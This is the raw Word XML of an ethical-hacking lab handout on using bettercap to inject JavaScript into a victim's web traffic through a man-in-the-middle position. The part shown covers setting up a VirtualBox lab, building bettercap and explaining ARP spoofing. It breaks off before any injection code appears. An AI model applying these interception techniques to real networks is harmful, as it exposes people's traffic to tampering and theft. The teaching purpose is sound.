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A66DA" w14:textId="67E712E4" w:rsidR="00FF7FC1" w:rsidRDefault="00D44D0F" w:rsidP="00F31E5C">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc190963935"/>
      <w:r>
        <w:t>Bettercap</w:t>
      </w:r>
      <w:r w:rsidR="00C85832">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C911DE">
        <w:t xml:space="preserve">Injecting </w:t>
      </w:r>
      <w:r w:rsidR="009D3A71">
        <w:t>JavaScript</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:id w:val="-9762962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F505A8F" w14:textId="320AC9AE" w:rsidR="0021777C" w:rsidRDefault="0021777C">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
          </w:pPr>
          <w:r>
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="3E69A919" w14:textId="2D805DF2" w:rsidR="008E7080" w:rsidRDefault="0021777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963935" w:history="1">
            <w:r w:rsidR="008E7080" w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Bettercap Injecting JavaScript</w:t>
            </w:r>
            <w:r w:rsidR="008E7080">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="008E7080">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="008E7080">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc190963935 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="008E7080">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="008E7080">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="008E7080">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="008E7080">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7689009E" w14:textId="55AE285A" w:rsidR="008E7080" w:rsidRDefault="008E708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0963936" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Lab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993C1" w14:textId="5AE95B28" w:rsidR="008E7080" w:rsidRDefault="008E708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0963937" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Update Kali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60B63" w14:textId="6F55B304" w:rsidR="008E7080" w:rsidRDefault="008E708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0963938" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Install or Update Bettercap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F9840" w14:textId="18B5AB55" w:rsidR="008E7080" w:rsidRDefault="008E708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0963939" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Injecting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0B8F0" w14:textId="02F222BD" w:rsidR="008E7080" w:rsidRDefault="008E708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0963940" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1. Create a NAT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39DC9" w14:textId="714B4B55" w:rsidR="008E7080" w:rsidRDefault="008E708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0963941" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2. View Local IP Address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9169E" w14:textId="04FB5350" w:rsidR="008E7080" w:rsidRDefault="008E708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0963942" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3. Automate bettercap with a Caplet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562C6" w14:textId="0C19A209" w:rsidR="008E7080" w:rsidRDefault="008E708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0963943" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4. bettercap JavaScript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B0253" w14:textId="582D020E" w:rsidR="008E7080" w:rsidRDefault="008E708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0963944" w:history="1">
            <w:r w:rsidRPr="005501D7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Assignment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B1A57" w14:textId="6034ED10" w:rsidR="00803366" w:rsidRDefault="0021777C" w:rsidP="00074C1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4C08EB9" w14:textId="6737B96C" w:rsidR="00074C1E" w:rsidRDefault="00074C1E" w:rsidP="00074C1E">
      <w:r>
        <w:t xml:space="preserve">Time required: </w:t>
      </w:r>
      <w:r w:rsidR="00987055">
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:t>0 minutes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7452A603" w14:textId="7BAFA406" w:rsidR="00165D51" w:rsidRDefault="00165D51" w:rsidP="00165D51">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc190963936"/>
      <w:r>
        <w:t>Lab Requirements</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="1C346C39" w14:textId="5E6D73B2" w:rsidR="00A24B6B" w:rsidRPr="00A24B6B" w:rsidRDefault="00A24B6B" w:rsidP="00A24B6B">
      <w:r>
        <w:t>This lab can disrupt network communications on a production network. We want to do this lab in a completely virtual environment.</w:t>
      </w:r>
      <w:r w:rsidR="006C75F6">
        <w:t xml:space="preserve"> VirtualBox is used for this lab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F121E5B" w14:textId="19F57388" w:rsidR="00165D51" w:rsidRDefault="00165D51" w:rsidP="00AF063E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Kali Linux VM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="785DD536" w14:textId="0B07BEBD" w:rsidR="00165D51" w:rsidRDefault="00165D51" w:rsidP="00AF063E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Windows VM</w:t>
      </w:r>
      <w:r w:rsidR="000B37A5">
        <w:t xml:space="preserve"> with Google Chrome</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF64792" w14:textId="3EF972A6" w:rsidR="00165D51" w:rsidRDefault="00165D51" w:rsidP="00AF063E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Both VM’s on </w:t>
      </w:r>
      <w:r w:rsidR="000B37A5">
        <w:t>the same</w:t>
      </w:r>
      <w:r w:rsidR="008071B9">
        <w:t xml:space="preserve"> user created </w:t>
      </w:r>
      <w:r>
        <w:t>NAT network</w:t>
      </w:r>
      <w:r w:rsidR="008071B9">
        <w:t xml:space="preserve"> with DHCP enabled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F9B8E7" w14:textId="1E657621" w:rsidR="00A86A36" w:rsidRDefault="00A86A36" w:rsidP="002A156D">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc190963937"/>
      <w:r>
        <w:t>Update Kali Linux</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="46448998" w14:textId="2D25CC6F" w:rsidR="00EA1A2A" w:rsidRPr="00EA1A2A" w:rsidRDefault="00EA1A2A" w:rsidP="00EA1A2A">
      <w:r>
        <w:t>This is a good idea to do before starting any lab with Kali Linux.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1052" w14:paraId="4D7F0682" w14:textId="77777777" w:rsidTr="00EA1A2A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="642F2DB4" w14:textId="5DCE5CBD" w:rsidR="00101052" w:rsidRDefault="00101052" w:rsidP="00EA1A2A">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>sudo apt update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DD55DE0" w14:textId="5AFEFC1A" w:rsidR="00101052" w:rsidRDefault="00101052" w:rsidP="00EA1A2A">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>sudo apt dist-upgrade -y</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BAEBEAF" w14:textId="34369EBC" w:rsidR="00DA7AC9" w:rsidRDefault="00DB3379" w:rsidP="00866039">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc190963938"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Install or </w:t>
      </w:r>
      <w:r w:rsidR="00DA7AC9">
        <w:t>Update Bettercap</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="6C67255E" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="00DB3379">
      <w:r w:rsidRPr="009100B7">
        <w:t>Sniffing is the process of capturing and monitoring data packets that are passed through the network. It is used to capture the data of the victim</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="009100B7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidRPr="009100B7">
        <w:t>ettercap is a powerful tool used to perform various MITM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009100B7">
        <w:t>(man in the middle) attacks on a network. ARP Spoofing is a type of attack in which an attacker sends false ARP (Address Resolution Protocol) messages over a LAN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009100B7">
        <w:t>(local area network).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1187A6" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRPr="00153023" w:rsidRDefault="00DB3379" w:rsidP="00DB3379">
      <w:r>
        <w:t>To install Bettercap, let’s do a clean build direct from the bettercap github repository. To make it easy, we are going to create a shell script to do it automatically.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578DD8EC" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="00DB3379">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In Linux </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> create a file named </w:t>
      </w:r>
      <w:r w:rsidRPr="00A74941">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>install_bettercap.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C7CBF8" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="00DB3379">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Copy and paste the following commands into the script file.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255"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DB3379" w14:paraId="10E6BC8F" w14:textId="77777777" w:rsidTr="001F16F5">
        <w:trPr>
          <w:cantSplit/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="10255" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="46E8DB0F" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>cd ~</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E28B2ED" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>sudo apt update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A651E31" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>sudo apt install -y golang git libusb-1.0-0-dev libpcap-dev libnetfilter-queue-dev</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04440D74" w14:textId="50BC49D2" w:rsidR="00DB3379" w:rsidRDefault="00DD5FF7" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">sudo </w:t>
            </w:r>
            <w:r w:rsidR="00DB3379">
              <w:t>git clone https://github.com/bettercap/bettercap.git</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41C4D1D7" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>cd bettercap</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36B2EF83" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>go install</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="099B363B" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>go build</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="227C2D68" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRPr="00FF312F" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>sudo ./bettercap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EDC8240" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="00DB3379">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Type: </w:t>
      </w:r>
      <w:r w:rsidRPr="00897144">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>bash install_bettercap.sh</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to run the shell script. This may take some time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7DDC51" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="00DB3379">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>In bettercap type in the following command to update bettercap.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3379" w14:paraId="311D4024" w14:textId="77777777" w:rsidTr="001F16F5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="3379EE10" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRPr="00711648" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00711648">
              <w:t>caplets.update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67AE9F2C" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRDefault="00DB3379" w:rsidP="001F16F5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>update.check on</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A3260CC" w14:textId="77777777" w:rsidR="00DB3379" w:rsidRPr="00273B5B" w:rsidRDefault="00DB3379" w:rsidP="00DB3379">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Type </w:t>
      </w:r>
      <w:r w:rsidRPr="00B53832">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> to q</w:t>
      </w:r>
      <w:r w:rsidRPr="00B067D8">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>uit bettercap.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380B2DE0" w14:textId="4D9785ED" w:rsidR="00D1604B" w:rsidRDefault="009D3A71" w:rsidP="002A156D">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc190963939"/>
      <w:r>
        <w:t>Injecting JavaScript</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="775357BB" w14:textId="23CBD3F6" w:rsidR="002A156D" w:rsidRPr="002A156D" w:rsidRDefault="002A156D" w:rsidP="002A156D">
      <w:r>
        <w:t>We know how to be the man in the middle</w:t>
      </w:r>
      <w:r w:rsidR="00603570">
        <w:t xml:space="preserve"> and capture all the packets from a </w:t>
      </w:r>
      <w:r w:rsidR="009D3A71">
        <w:t xml:space="preserve">victim. We can insert </w:t>
      </w:r>
      <w:r w:rsidR="00DC77C0">
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="009D3A71">
        <w:t xml:space="preserve"> code into the html that is passing through our Kali Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8CDF4B" w14:textId="783531B2" w:rsidR="00D1604B" w:rsidRDefault="009D3A71" w:rsidP="00D1604B">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BC072D3" wp14:editId="23C9FC27">
            <wp:extent cx="4857750" cy="2791649"/>
            <wp:effectExtent l="38100" t="38100" r="95250" b="1041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210" cy="280685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31F255" w14:textId="77777777" w:rsidR="004B4D15" w:rsidRDefault="004B4D15" w:rsidP="004B4D15">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc190778058"/>
      <w:bookmarkStart w:id="6" w:name="_Toc190963940"/>
      <w:r w:rsidRPr="006516E0">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="006516E0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Create a NAT Network</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="272A8657" w14:textId="77777777" w:rsidR="004B4D15" w:rsidRPr="005F74B1" w:rsidRDefault="004B4D15" w:rsidP="004B4D15">
      <w:r>
        <w:t>If you already have an EthicalHacking VM as shown, you can skip this step.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25707AD1" w14:textId="77777777" w:rsidR="004B4D15" w:rsidRDefault="004B4D15" w:rsidP="004B4D15">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In VirtualBox Manager </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> In VirtualBox Manager </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005F74B1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>File</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005F74B1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005F74B1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Network Manager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67247B24" w14:textId="77777777" w:rsidR="004B4D15" w:rsidRDefault="004B4D15" w:rsidP="004B4D15">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00100D5A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Nat Networks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tab </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00100D5A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Create</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D94FE66" w14:textId="77777777" w:rsidR="004B4D15" w:rsidRDefault="004B4D15" w:rsidP="004B4D15">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4141D97B" wp14:editId="1641258B">
            <wp:extent cx="4727448" cy="2816352"/>
            <wp:effectExtent l="38100" t="38100" r="92710" b="98425"/>
            <wp:docPr id="788506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0657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7448" cy="2816352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D9A880" w14:textId="7934268F" w:rsidR="004B4D15" w:rsidRPr="00165D51" w:rsidRDefault="004B4D15" w:rsidP="004B4D15">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>You should have internet access on both VM’s.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">If not </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the VirtualBox Manager go to Settings </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Network </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> switch to Bridged Adapter </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click OK </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> go back and switch to NAT Network</w:t>
      </w:r>
      <w:r w:rsidR="006D4B79">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006D4B79">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="006D4B79">
        <w:t xml:space="preserve"> Click OK.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7684E09E" w14:textId="07EF304E" w:rsidR="003106B9" w:rsidRPr="002F1B7D" w:rsidRDefault="004C7DC3" w:rsidP="003106B9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc190963941"/>
      <w:r>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="006309C8">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="003106B9" w:rsidRPr="006516E0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003106B9" w:rsidRPr="002F1B7D">
        <w:t>View</w:t>
      </w:r>
      <w:r w:rsidR="003106B9">
        <w:t xml:space="preserve"> Local IP Address Information</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="62AA00B6" w14:textId="42FFBE81" w:rsidR="003106B9" w:rsidRDefault="003106B9" w:rsidP="003106B9">
      <w:r>
        <w:t xml:space="preserve">On your Kali Linux: </w:t>
      </w:r>
      <w:r w:rsidR="00924504">
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="002F1B7D">
        <w:t xml:space="preserve">un the following command in the terminal to find out the name </w:t>
      </w:r>
      <w:r w:rsidR="00943E78">
        <w:t xml:space="preserve">and IP address </w:t>
      </w:r>
      <w:r w:rsidRPr="002F1B7D">
        <w:t>of the network interface that you’re using</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="002D5A0F">
        <w:t>In a VirtualBox VM i</w:t>
      </w:r>
      <w:r>
        <w:t>t is commonly eth0.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06B9" w14:paraId="69FDA776" w14:textId="77777777" w:rsidTr="00DC3DD8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="2EEA34F0" w14:textId="7E589EBA" w:rsidR="003106B9" w:rsidRDefault="00D81BD5" w:rsidP="00DC3DD8">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>ip a</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="430E569F" w14:textId="77777777" w:rsidR="003106B9" w:rsidRPr="00D52BF8" w:rsidRDefault="003106B9" w:rsidP="003106B9">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D52BF8">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="-759374585"/>
        <w:placeholder>
          <w:docPart w:val="D12680978DF54D4A925FC9191275312C"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="181DFC2A" w14:textId="77777777" w:rsidR="003106B9" w:rsidRPr="002F1B7D" w:rsidRDefault="003106B9" w:rsidP="003106B9">
          <w:pPr>
